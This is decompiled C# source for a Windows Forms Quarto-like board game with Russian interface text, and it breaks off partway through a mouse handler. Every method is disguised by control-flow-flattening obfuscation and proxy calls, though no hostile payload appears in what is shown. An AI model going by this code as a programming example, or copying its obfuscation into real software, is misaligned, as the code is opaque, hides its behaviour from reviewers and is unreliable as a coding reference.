using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Threading;
using System.Windows.Forms;

namespace Cytotechnologist;

public class Form1 : Form
{
	public class Figurine
	{
		public bool Dark;

		public bool Big;

		public bool Square;

		public bool Point;

		public Figurine(bool dark, bool big, bool square, bool point)
		{
			while (true)
			{
				int num = -2009785563;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x87474270u) % 5u)
					{
					case 4u:
						Dark = dark;
						Big = big;
						Square = square;
						Point = point;
						num = (int)((num2 * 184891247) ^ 0x6D352259);
						continue;
					case 3u:
						num = ((int)num2 * -1468036767) ^ -612485184;
						continue;
					case 0u:
						num = ((int)num2 * -292549977) ^ -1651961018;
						continue;
					default:
						return;
					case 2u:
						break;
					case 1u:
						return;
					}
					break;
				}
			}
		}

		public Figurine(Figurine copy)
		{
			while (true)
			{
				int num = 665983720;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0x5A05A0A6u) % 6u)
					{
					case 5u:
						num = ((int)num2 * -228627845) ^ -318267847;
						continue;
					case 2u:
						num = ((int)num2 * -1095166512) ^ -1224228057;
						continue;
					case 1u:
						Square = copy.Square;
						Point = copy.Point;
						num = ((int)num2 * -350120096) ^ -335506028;
						continue;
					case 0u:
						Dark = copy.Dark;
						Big = copy.Big;
						num = (int)(num2 * 265383646) ^ -169778797;
						continue;
					default:
						return;
					case 3u:
						break;
					case 4u:
						return;
					}
					break;
				}
			}
		}
	}

	private Form menu;

	private Random rnd = Form1.smethod_0();

	private Figurine[,] storage;

	private Figurine[,] board;

	private readonly int size = 60;

	public bool turn;

	private DateTime time;

	private int step;

	private PictureBox[,] pictureBox;

	private PictureBox[,] borderBox;

	private IContainer components = null;

	private static Type ComMember;

	private PictureBox pictureBox1;

	private Button button2;

	private Button button1;

	private RichTextBox richTextBox1;

	private Panel panel1;

	private Label label1;

	private Label label2;

	private Label label5;

	private Label label6;

	public Timer timer1;

	public Form1()
	{
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_030f: Expected O, but got Unknown
		bool flag2 = default(bool);
		int num3 = default(int);
		int num4 = default(int);
		double num8 = default(double);
		bool flag = default(bool);
		while (true)
		{
			int num = -867395163;
			while (true)
			{
				uint num2;
				double num7;
				PictureBox[,] array;
				int num9;
				int num10;
				PictureBox obj;
				switch ((num2 = (uint)num ^ 0xFC7AF556u) % 23u)
				{
				case 22u:
				{
					int num11;
					int num12;
					if (flag2)
					{
						num11 = -2525100;
						num12 = -2525100;
					}
					else
					{
						num11 = -428672857;
						num12 = -428672857;
					}
					num = num11 ^ (int)(num2 * 613231234);
					continue;
				}
				case 21u:
					if (num3 >= 2)
					{
						num = -325927322;
						continue;
					}
					num7 = 0.0;
					goto IL_0064;
				case 20u:
					num = (int)((num2 * 464384045) ^ 0x60C73C57);
					continue;
				case 18u:
					Form1.smethod_11((Control)(object)menu);
					num = ((int)num2 * -1859759844) ^ -1735191824;
					continue;
				case 17u:
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)borderBox[num4, num3]);
					num = (int)((num2 * 2132125143) ^ 0x3270CEEF);
					continue;
				case 16u:
				{
					PictureBox[,] array2 = borderBox;
					int num13 = num4;
					int num14 = num3;
					PictureBox obj2 = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj2, new Size(size - 2, size - 2));
					Form1.smethod_4((Control)(object)obj2, new Point(1 + (int)(((double)num3 + num8) * (double)size), 1 + num4 * size));
					Form1.smethod_7((Control)(object)obj2, bool_0: false);
					array2[num13, num14] = obj2;
					Form1.smethod_9(Form1.smethod_8((Control)(object)panel1), (Control)(object)pictureBox[num4, num3]);
					num = (int)((num2 * 262002221) ^ 0x64DAA8C6);
					continue;
				}
				case 15u:
					num4++;
					num = ((int)num2 * -751267547) ^ -1434765792;
					continue;
				case 14u:
					num = (int)((num2 * 279233170) ^ 0x4950F600);
					continue;
				case 13u:
					num = (int)((num2 * 1768875174) ^ 0x56BE5AD7);
					continue;
				case 12u:
					InitializeComponent();
					num = (int)((num2 * 14186563) ^ 0x23E917D9);
					continue;
				case 11u:
					num = ((int)num2 * -1186673674) ^ -1744314349;
					continue;
				case 10u:
					num7 = 4.1;
					goto IL_0064;
				case 9u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 1586235225;
						num6 = 1586235225;
					}
					else
					{
						num5 = 1383697002;
						num6 = 1383697002;
					}
					num = num5 ^ ((int)num2 * -1166007734);
					continue;
				}
				case 8u:
					flag2 = num3 < 4;
					num = -56065680;
					continue;
				case 7u:
					num3++;
					num = (int)((num2 * 1553424624) ^ 0x7016298D);
					continue;
				case 6u:
					Form1.smethod_1(richTextBox1, (HorizontalAlignment)2);
					pictureBox = new PictureBox[4, 4];
					borderBox = new PictureBox[4, 4];
					num4 = 0;
					num = ((int)num2 * -407575899) ^ 0xA390CC;
					continue;
				case 5u:
				{
					Form3 form_ = new Form3();
					Form1.smethod_10((Form)(object)form_, (Form)(object)this);
					menu = (Form)(object)form_;
					num = ((int)num2 * -1661547356) ^ 0x30BCBD2C;
					continue;
				}
				case 3u:
					num = ((int)num2 * -1086294243) ^ -1726333375;
					continue;
				case 2u:
					flag = num4 < 4;
					num = -1888943740;
					continue;
				case 1u:
					Form1.smethod_6((Control)(object)pictureBox[num4, num3], new MouseEventHandler(PictureBoxIJ_MouseDown));
					num = ((int)num2 * -2137445911) ^ -1281996103;
					continue;
				case 0u:
					num3 = 0;
					num = -1387338300;
					continue;
				default:
					return;
				case 19u:
					break;
				case 4u:
					return;
					IL_0064:
					num8 = num7;
					array = pictureBox;
					num9 = num4;
					num10 = num3;
					obj = Form1.smethod_2();
					Form1.smethod_3((Control)(object)obj, new Size(size - 8, size - 8));
					Form1.smethod_4((Control)(object)obj, new Point(4 + (int)(((double)num3 + num8) * (double)size), 4 + num4 * size));
					Form1.smethod_5((Control)(object)obj, Color.White);
					array[num9, num10] = obj;
					num = -2071020328;
					continue;
				}
				break;
			}
		}
	}

	private void Form1_LocationChanged(object sender, EventArgs e)
	{
		Form1.smethod_13(menu, new Point(Form1.smethod_12((Form)(object)this).X + 8, Form1.smethod_12((Form)(object)this).Y + 51));
	}

	private void Form1_Shown(object sender, EventArgs e)
	{
		Form1.smethod_14(menu);
		while (true)
		{
			int num = 2061635551;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x5EAC0B65u) % 3u)
				{
				case 1u:
					goto IL_000d;
				default:
					return;
				case 0u:
					break;
				case 2u:
					return;
				}
				break;
				IL_000d:
				num = ((int)num2 * -960824991) ^ -678997530;
			}
		}
	}

	public void Button1_Click(object sender, EventArgs e)
	{
		Form1.smethod_15(timer1);
		while (true)
		{
			int num = 44868411;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x468AAC39u) % 8u)
				{
				case 7u:
					num = ((int)num2 * -1587908674) ^ -2034284829;
					continue;
				case 5u:
					num = (int)((num2 * 1177696011) ^ 0x6C802C9E);
					continue;
				case 3u:
				{
					Form control_ = menu;
					Form1.smethod_17((Control)(object)control_, Form1.smethod_16((Control)(object)control_) + 5);
					num = 1330578660;
					continue;
				}
				case 2u:
					num = (int)(num2 * 622810831) ^ -188326984;
					continue;
				case 1u:
					Form1.smethod_14(menu);
					num = (int)((num2 * 1910348697) ^ 0x11B9CDAE);
					continue;
				case 0u:
				{
					int num3;
					if (Form1.smethod_16((Control)(object)menu) < 296)
					{
						num = 1653200450;
						num3 = 1653200450;
					}
					else
					{
						num = 1885174544;
						num3 = 1885174544;
					}
					continue;
				}
				default:
					return;
				case 4u:
					break;
				case 6u:
					return;
				}
				break;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		board = new Figurine[4, 4];
		storage = new Figurine[4, 4];
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = -1569553244;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x817996D7u) % 18u)
				{
				case 17u:
					Form1.smethod_7((Control)(object)button2, bool_0: false);
					num = (int)((num2 * 1583240341) ^ 0x57A0A128);
					continue;
				case 15u:
					Paint_Storage();
					num = (int)(num2 * 313529431) ^ -460520283;
					continue;
				case 14u:
					num = (int)((num2 * 1196030202) ^ 0x315EB477);
					continue;
				case 13u:
					Form1.smethod_5((Control)(object)borderBox[num4, num3], Color.White);
					num = ((int)num2 * -1313458057) ^ 0x13E7B013;
					continue;
				case 12u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = ((int)num2 * -774397403) ^ -1851477158;
					continue;
				case 11u:
					num4 = 0;
					num = ((int)num2 * -394703531) ^ 0x66019832;
					continue;
				case 9u:
					num4++;
					num = (int)((num2 * 1009850012) ^ 0x25F66DC1);
					continue;
				case 8u:
					storage[num4, num3] = new Figurine(num4 < 2, num3 % 2 == 0, num3 < 2, num4 % 2 == 1);
					num = -1798059008;
					continue;
				case 7u:
					num3 = 0;
					num = -1148791457;
					continue;
				case 6u:
					num = (int)((num2 * 2019838415) ^ 0x3FD4E04C);
					continue;
				case 5u:
					Form1.smethod_7((Control)(object)pictureBox[num4, num3], bool_0: false);
					num = ((int)num2 * -1041043806) ^ 0x4536214F;
					continue;
				case 4u:
				{
					int num6;
					int num7;
					if (flag)
					{
						num6 = 355378664;
						num7 = 355378664;
					}
					else
					{
						num6 = 1503255134;
						num7 = 1503255134;
					}
					num = num6 ^ ((int)num2 * -749622455);
					continue;
				}
				case 3u:
				{
					int num5;
					if (num3 < 4)
					{
						num = -1344128081;
						num5 = -1344128081;
					}
					else
					{
						num = -375519066;
						num5 = -375519066;
					}
					continue;
				}
				case 2u:
					flag = num4 < 4;
					num = -773513297;
					continue;
				case 1u:
					Paint_Board();
					num = ((int)num2 * -636253667) ^ -1949858802;
					continue;
				case 0u:
					num3++;
					num = ((int)num2 * -1344862617) ^ -1228889206;
					continue;
				default:
					return;
				case 16u:
					break;
				case 10u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Board()
	{
		float num8 = default(float);
		float num3 = default(float);
		float num9 = default(float);
		float num11 = default(float);
		float num10 = default(float);
		Graphics graphics_ = default(Graphics);
		int num6 = default(int);
		int num7 = default(int);
		Brush brush_ = default(Brush);
		bool dark = default(bool);
		bool square = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -1395789242;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDEB75CE0u) % 37u)
				{
				case 36u:
					num = -626759022;
					continue;
				case 35u:
					num8 = 1f - num3 * 0.4f / (float)Form1.smethod_27(2.0);
					num9 = (float)size * (num8 / 2f);
					num11 = num10 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -59339512;
					continue;
				case 34u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num6 = 0;
					num = ((int)num2 * -119045457) ^ -364840361;
					continue;
				case 33u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num9 + (float)(num7 * size), num9 + (float)(num6 * size), num11, num11);
					num = ((int)num2 * -1848271571) ^ -1204541735;
					continue;
				case 32u:
					Form1.smethod_20(pictureBox1, (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox1), Form1.smethod_16((Control)(object)pictureBox1)));
					num = (int)((num2 * 743787303) ^ 0x9C100B6);
					continue;
				case 31u:
					num = ((int)num2 * -2103019684) ^ -2052146975;
					continue;
				case 30u:
					brush_ = Form1.smethod_25();
					num = ((int)num2 * -1135314998) ^ 0x4C285DBF;
					continue;
				case 29u:
					num7 = 0;
					num = -514177855;
					continue;
				case 28u:
				{
					int num16;
					if (num7 >= 4)
					{
						num = -1964440726;
						num16 = -1964440726;
					}
					else
					{
						num = -72539278;
						num16 = -72539278;
					}
					continue;
				}
				case 27u:
					num8 = 1f - num3 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -2032492767;
					continue;
				case 26u:
					num10 = (float)size * num3;
					num = ((int)num2 * -1711458083) ^ -1973779092;
					continue;
				case 24u:
					num = ((int)num2 * -1309499491) ^ 0x55BED7E6;
					continue;
				case 23u:
					num = ((int)num2 * -604307504) ^ 0x5D398A3;
					continue;
				case 22u:
					num6++;
					num = (int)(num2 * 1430771573) ^ -1692782297;
					continue;
				case 21u:
					num9 = (float)size * (num8 / 2f);
					num11 = num10 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1753785490) ^ 0x288A3C9D;
					continue;
				case 20u:
					dark = board[num6, num7].Dark;
					num = (int)((num2 * 1722195481) ^ 0x602A0492);
					continue;
				case 19u:
					Form1.smethod_24(graphics_, brush_, num9 + (float)(num7 * size), num9 + (float)(num6 * size), num11, num11);
					num = -862521996;
					continue;
				case 18u:
				{
					int num20;
					int num21;
					if (board[num6, num7] == null)
					{
						num20 = 140526074;
						num21 = 140526074;
					}
					else
					{
						num20 = 1735206248;
						num21 = 1735206248;
					}
					num = num20 ^ ((int)num2 * -565691073);
					continue;
				}
				case 17u:
				{
					int num18;
					int num19;
					if (!board[num6, num7].Point)
					{
						num18 = -1906682034;
						num19 = -1906682034;
					}
					else
					{
						num18 = -52801645;
						num19 = -52801645;
					}
					num = num18 ^ ((int)num2 * -160644713);
					continue;
				}
				case 16u:
					num = -1109388519;
					continue;
				case 15u:
					Form1.smethod_24(graphics_, Form1.smethod_23(), ((float)num7 + 0.05f) * (float)size, ((float)num6 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = ((int)num2 * -769887914) ^ -1220416015;
					continue;
				case 14u:
					Form1.smethod_28(graphics_, brush_, num9 + (float)(num7 * size), num9 + (float)(num6 * size), num11, num11);
					num = ((int)num2 * -1835081142) ^ -1793188032;
					continue;
				case 12u:
					square = board[num6, num7].Square;
					num = ((int)num2 * -1104255377) ^ -578366162;
					continue;
				case 11u:
				{
					int num17;
					if (board[num6, num7].Big)
					{
						num = -86340270;
						num17 = -86340270;
					}
					else
					{
						num = -276648091;
						num17 = -276648091;
					}
					continue;
				}
				case 10u:
					flag = num6 < 4;
					num = -947875195;
					continue;
				case 9u:
					num7++;
					num = -483008141;
					continue;
				case 8u:
					brush_ = Form1.smethod_26();
					num = -201964717;
					continue;
				case 7u:
					num = (int)((num2 * 1413703007) ^ 0x4C694DFE);
					continue;
				case 6u:
				{
					int num14;
					int num15;
					if (flag)
					{
						num14 = 959944407;
						num15 = 959944407;
					}
					else
					{
						num14 = 617633201;
						num15 = 617633201;
					}
					num = num14 ^ (int)(num2 * 1950106044);
					continue;
				}
				case 5u:
				{
					int num12;
					int num13;
					if (!dark)
					{
						num12 = 273460601;
						num13 = 273460601;
					}
					else
					{
						num12 = 523722702;
						num13 = 523722702;
					}
					num = num12 ^ (int)(num2 * 678987024);
					continue;
				}
				case 4u:
					num3 = 1f;
					num = ((int)num2 * -1471964338) ^ -1820879818;
					continue;
				case 3u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1753733515) ^ -402413506;
					continue;
				case 2u:
				{
					int num4;
					int num5;
					if (square)
					{
						num4 = 1892643672;
						num5 = 1892643672;
					}
					else
					{
						num4 = 638838785;
						num5 = 638838785;
					}
					num = num4 ^ (int)(num2 * 2075952159);
					continue;
				}
				case 1u:
					num3 = 0.7f;
					num = -1536743324;
					continue;
				case 0u:
					num = (int)(num2 * 287149807) ^ -1991431172;
					continue;
				default:
					return;
				case 13u:
					break;
				case 25u:
					return;
				}
				break;
			}
		}
	}

	private void Paint_Storage()
	{
		int num4 = default(int);
		float num12 = default(float);
		int num3 = default(int);
		Graphics graphics_ = default(Graphics);
		bool dark = default(bool);
		float num19 = default(float);
		float num20 = default(float);
		Brush brush_ = default(Brush);
		float num8 = default(float);
		float num9 = default(float);
		bool flag2 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -2004887275;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xDD898E8Cu) % 35u)
				{
				case 34u:
				{
					int num16;
					if (num4 >= 4)
					{
						num = -2135784097;
						num16 = -2135784097;
					}
					else
					{
						num = -1825293508;
						num16 = -1825293508;
					}
					continue;
				}
				case 33u:
					num = ((int)num2 * -1290313844) ^ -6530102;
					continue;
				case 32u:
					num12 = 0.7f;
					num = -1687293050;
					continue;
				case 31u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)(object)Form1.smethod_19(Form1.smethod_18((Control)(object)pictureBox[num3, num4]), Form1.smethod_16((Control)(object)pictureBox[num3, num4])));
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox[num3, num4]));
					dark = storage[num3, num4].Dark;
					num = (int)(num2 * 1646398866) ^ -2054865268;
					continue;
				case 29u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = -1508475600;
					continue;
				case 28u:
					num19 = 1f - num12 * 0.9f / (float)Form1.smethod_27(2.0);
					num = -1065145617;
					continue;
				case 27u:
					num20 = (float)size * num12;
					num = (int)(num2 * 235874980) ^ -421628734;
					continue;
				case 26u:
					num = (int)((num2 * 800072517) ^ 0x722A6874);
					continue;
				case 25u:
				{
					int num13;
					if (!storage[num3, num4].Big)
					{
						num = -998662964;
						num13 = -998662964;
					}
					else
					{
						num = -1884296182;
						num13 = -1884296182;
					}
					continue;
				}
				case 24u:
				{
					int num7;
					if (num3 >= 4)
					{
						num = -1933919667;
						num7 = -1933919667;
					}
					else
					{
						num = -1763503250;
						num7 = -1763503250;
					}
					continue;
				}
				case 23u:
					num = (int)((num2 * 1223404281) ^ 0x589BF5C7);
					continue;
				case 22u:
					brush_ = Form1.smethod_26();
					num = -1182146767;
					continue;
				case 21u:
					num3 = 0;
					num = (int)(num2 * 392741260) ^ -1020560505;
					continue;
				case 20u:
					Form1.smethod_24(graphics_, (Brush)(object)Form1.smethod_29(Color.FromArgb(180, Color.Peru)), num8, num8, num9, num9);
					num = ((int)num2 * -214628419) ^ -266061027;
					continue;
				case 19u:
					flag2 = storage[num3, num4] != null;
					num = -860436858;
					continue;
				case 18u:
					Form1.smethod_24(graphics_, brush_, num8, num8, num9, num9);
					num = -508747786;
					continue;
				case 16u:
					num = ((int)num2 * -2109610186) ^ 0x53B7D4C6;
					continue;
				case 15u:
					num4++;
					num = -62278488;
					continue;
				case 14u:
					num4 = 0;
					num = -1480759392;
					continue;
				case 13u:
					flag = num4 < 2;
					num = (int)((num2 * 1328428513) ^ 0x25B85E54);
					continue;
				case 12u:
					num12 = 1f;
					num = ((int)num2 * -185992077) ^ -1173544866;
					continue;
				case 11u:
					num8 = (float)size * (num19 / 2f) - 4f;
					num9 = num20 * 0.4f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -649318177) ^ -1404876516;
					continue;
				case 10u:
					num8 = (float)size * (num19 / 2f) - 4f;
					num9 = num20 * 0.9f / (float)Form1.smethod_27(2.0);
					num = ((int)num2 * -1138952205) ^ 0x54F9F72C;
					continue;
				case 9u:
					num19 = 1f - num12 * 0.4f / (float)Form1.smethod_27(2.0);
					num = -1635920272;
					continue;
				case 8u:
					num = (int)(num2 * 463836630) ^ -301978759;
					continue;
				case 7u:
				{
					int num17;
					int num18;
					if (!flag2)
					{
						num17 = 382013706;
						num18 = 382013706;
					}
					else
					{
						num17 = 189218399;
						num18 = 189218399;
					}
					num = num17 ^ ((int)num2 * -362676120);
					continue;
				}
				case 6u:
				{
					int num14;
					int num15;
					if (!dark)
					{
						num14 = -1533919532;
						num15 = -1533919532;
					}
					else
					{
						num14 = -1436796289;
						num15 = -1436796289;
					}
					num = num14 ^ (int)(num2 * 1262068494);
					continue;
				}
				case 5u:
				{
					int num10;
					int num11;
					if (!flag)
					{
						num10 = 1653829115;
						num11 = 1653829115;
					}
					else
					{
						num10 = 1950317068;
						num11 = 1950317068;
					}
					num = num10 ^ (int)(num2 * 1156266142);
					continue;
				}
				case 4u:
					num3++;
					num = ((int)num2 * -600216101) ^ 0x686FFA58;
					continue;
				case 3u:
					brush_ = Form1.smethod_25();
					num = (int)((num2 * 1103447126) ^ 0x67B996B);
					continue;
				case 2u:
					num = (int)((num2 * 576860209) ^ 0x1B011A2E);
					continue;
				case 1u:
					Form1.smethod_28(graphics_, brush_, num8, num8, num9, num9);
					num = ((int)num2 * -542962838) ^ 0x5514B576;
					continue;
				case 0u:
				{
					int num5;
					int num6;
					if (storage[num3, num4].Point)
					{
						num5 = -1354147007;
						num6 = -1354147007;
					}
					else
					{
						num5 = -1599371316;
						num6 = -1599371316;
					}
					num = num5 ^ (int)(num2 * 1091367539);
					continue;
				}
				default:
					return;
				case 30u:
					break;
				case 17u:
					return;
				}
				break;
			}
		}
	}

	public void StartGame()
	{
		Form1_Load(this, Form1.smethod_31());
		int num4 = default(int);
		int num6 = default(int);
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = -1566181978;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC48D6FF3u) % 32u)
				{
				case 31u:
					num4 = Form1.smethod_33(rnd, 4);
					num = (int)((num2 * 1729238706) ^ 0x47059FF9);
					continue;
				case 30u:
				{
					int num10;
					if (num6 < 4)
					{
						num = -455120411;
						num10 = -455120411;
					}
					else
					{
						num = -1972283916;
						num10 = -1972283916;
					}
					continue;
				}
				case 29u:
					num = ((int)num2 * -1589474288) ^ 0x25C52DFA;
					continue;
				case 28u:
					num = ((int)num2 * -1649482548) ^ -1123291573;
					continue;
				case 27u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ваш ход. Выберете фигуру, которой будет играть противник.");
					num = (int)((num2 * 328194035) ^ 0x1FD05163);
					continue;
				case 26u:
					num = ((int)num2 * -416278818) ^ 0x1AFB8841;
					continue;
				case 25u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = -1141941248;
					continue;
				case 24u:
					num = -1064379472;
					continue;
				case 22u:
					Form1.smethod_7((Control)(object)pictureBox[num5, num6], bool_0: true);
					num = -2011521741;
					continue;
				case 21u:
				{
					int num8;
					int num9;
					if (!turn)
					{
						num8 = -765715123;
						num9 = -765715123;
					}
					else
					{
						num8 = -785343319;
						num9 = -785343319;
					}
					num = num8 ^ ((int)num2 * -960619186);
					continue;
				}
				case 20u:
					num6++;
					num = ((int)num2 * -843217056) ^ 0x97F768D;
					continue;
				case 19u:
					time = new DateTime(0L, DateTimeKind.Unspecified);
					num = (int)(num2 * 527824522) ^ -948015713;
					continue;
				case 18u:
					Form1.smethod_35(timer1, bool_0: true);
					num = (int)((num2 * 1218476762) ^ 0x2BD4E10C);
					continue;
				case 17u:
					step = 0;
					num = (int)(num2 * 832530282) ^ -253541419;
					continue;
				case 16u:
					step = 1;
					num = (int)((num2 * 1703425078) ^ 0x4D166E2E);
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 1413977916) ^ 0x7F9EB0DA);
					continue;
				case 14u:
				{
					int num7;
					if (num5 < 4)
					{
						num = -1502308486;
						num7 = -1502308486;
					}
					else
					{
						num = -631336664;
						num7 = -631336664;
					}
					continue;
				}
				case 13u:
					Form1.smethod_32((Control)(object)richTextBox1, "Противник выбрал фигуру. Выберете поле на доске для установки этой фигуры.");
					num = (int)((num2 * 1754486427) ^ 0x50DBD78D);
					continue;
				case 12u:
					num = (int)(num2 * 13322900) ^ -1728648347;
					continue;
				case 11u:
					num = ((int)num2 * -818686328) ^ 0xFB3EA8E;
					continue;
				case 10u:
					num = ((int)num2 * -1957039779) ^ -682012450;
					continue;
				case 9u:
					num6 = 0;
					num = -1723769015;
					continue;
				case 8u:
					num5 = 0;
					num = (int)(num2 * 1278964655) ^ -997812887;
					continue;
				case 7u:
					num5++;
					num = (int)(num2 * 1789626412) ^ -128849911;
					continue;
				case 6u:
					num = ((int)num2 * -288570496) ^ 0x1FBD32A;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.Blue);
					num = (int)((num2 * 1993707787) ^ 0x5B20D6F5);
					continue;
				case 3u:
					num3 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1217194972) ^ 0x45821680;
					continue;
				case 2u:
					num = ((int)num2 * -1265227314) ^ -1099785823;
					continue;
				case 1u:
					num = ((int)num2 * -510268529) ^ 0x1E50C18C;
					continue;
				case 0u:
					num = ((int)num2 * -2059539697) ^ 0x62EBBA27;
					continue;
				case 23u:
					break;
				default:
					Form1.smethod_36(timer1);
					return;
				}
				break;
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		while (true)
		{
			int num = -1168000449;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x846AD43Au) % 4u)
				{
				case 1u:
					time = time.AddSeconds(1.0);
					num = (int)(num2 * 1682493295) ^ -838733231;
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)label1, Form1.smethod_34("Время: ", time.ToString("HH:mm:ss")));
					num = (int)((num2 * 340011172) ^ 0x449D8CB4);
					continue;
				default:
					return;
				case 3u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void PictureBoxIJ_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0212: Unknown result type (might be due to invalid IL or missing references)
		//IL_0228: Expected O, but got Unknown
		int num5 = default(int);
		Point point = default(Point);
		int num4 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		int num7 = default(int);
		while (true)
		{
			int num = -438509987;
			while (true)
			{
				uint num2;
				int num6;
				switch ((num2 = (uint)num ^ 0xEB7E6CB9u) % 21u)
				{
				case 20u:
				{
					num5 = point.X / size;
					int num11;
					int num12;
					if (num5 > 1)
					{
						num11 = 696221119;
						num12 = 696221119;
					}
					else
					{
						num11 = 444921652;
						num12 = 444921652;
					}
					num = num11 ^ ((int)num2 * -1028826248);
					continue;
				}
				case 19u:
					num = (int)((num2 * 1222181940) ^ 0x3B4DB518);
					continue;
				case 18u:
					num4 = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null)).Y / size;
					point = Form1.smethod_37((Control)((sender is PictureBox) ? sender : null));
					num = ((int)num2 * -981570588) ^ 0x14FC1E21;
					continue;
				case 17u:
					num3++;
					num = ((int)num2 * -397329662) ^ 0x655B300F;
					continue;
				case 16u:
					flag = num3 < 4;
					num = -95673808;
					continue;
				case 15u:
					Form1.smethod_7((Control)(object)button2, bool_0: true);
					num = (int)(num2 * 615677959) ^ -2134430645;
					continue;
				case 14u:
					num5 -= 4;
					num = ((int)num2 * -937328059) ^ 0x7D5EAFAA;
					continue;
				case 12u:
					Form1.smethod_32((Control)(object)richTextBox1, "Именно эта фигура? Если да - нажмите \"Подтвердить\".");
					num = (int)(num2 * 1053824950) ^ -411432226;
					continue;
				case 11u:
				{
					int num10;
					if (num7 < 4)
					{
						num = -2024268425;
						num10 = -2024268425;
					}
					else
					{
						num = -573051061;
						num10 = -573051061;
					}
					continue;
				}
				case 10u:
					num = (int)(num2 * 421008034) ^ -1152154469;
					continue;
				case 9u:
					Form1.smethod_5((Control)(object)borderBox[num3, num7], Color.White);
					num = -1760650694;
					continue;
				case 7u:
					num = (int)((num2 * 2013692923) ^ 0x57FE4CA2);
					continue;
				case 6u:
				{
					int num8;
					int num9;
					if (!flag)
					{
						num8 = 1457543313;
						num9 = 1457543313;
					}
					else
					{
						num8 = 141473448;
						num9 = 141473448;
					}
					num = num8 ^ ((int)num2 * -405478855);
					continue;
				}
				case 5u:
					num7 = 0;
					num = -1205511346;
					continue;
				case 4u:
					num7++;
					num = (int)(num2 * 750413882) ^ -748741302;
					continue;
				case 3u:
					if (storage[num4, num5] != null)
					{
						num = -1574154890;
						continue;
					}
					goto IL_01e7;
				case 2u:
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox[num4, num5]), Form1.smethod_38(e), Form1.smethod_39(e)) != Color.FromArgb(0, 0, 0, 0))
					{
						num = -959482361;
						num6 = -959482361;
						continue;
					}
					goto IL_01e7;
				case 1u:
					Form1.smethod_5((Control)(object)borderBox[num4, num5], Color.Red);
					num = (int)((num2 * 598947549) ^ 0x444701EE);
					continue;
				case 0u:
					num3 = 0;
					num = (int)(num2 * 964481687) ^ -1409806957;
					continue;
				default:
					return;
				case 13u:
					break;
				case 8u:
					return;
					IL_01e7:
					num = -615613368;
					num6 = -615613368;
					continue;
				}
				break;
			}
		}
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		//IL_0181: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		int num6 = default(int);
		Graphics graphics_ = default(Graphics);
		int num11 = default(int);
		bool flag2 = default(bool);
		int num3 = default(int);
		int num10 = default(int);
		bool flag3 = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num = -2062362986;
			while (true)
			{
				uint num2;
				int num7;
				switch ((num2 = (uint)num ^ 0xC600A22Au) % 26u)
				{
				case 24u:
					num6++;
					num = ((int)num2 * -1512069363) ^ -1762004715;
					continue;
				case 23u:
					num = (int)(num2 * 451510489) ^ -420978128;
					continue;
				case 22u:
					num = ((int)num2 * -1804808103) ^ -2108241909;
					continue;
				case 21u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1462602771) ^ -28850680;
					continue;
				case 20u:
					Paint_Board();
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num = ((int)num2 * -337350306) ^ 0x6BE3B9E0;
					continue;
				case 19u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num = (int)(num2 * 637390702) ^ -962975041;
					continue;
				case 18u:
					num11 = Form1.smethod_39(e) / size;
					num = (int)(num2 * 1047880410) ^ -848616839;
					continue;
				case 16u:
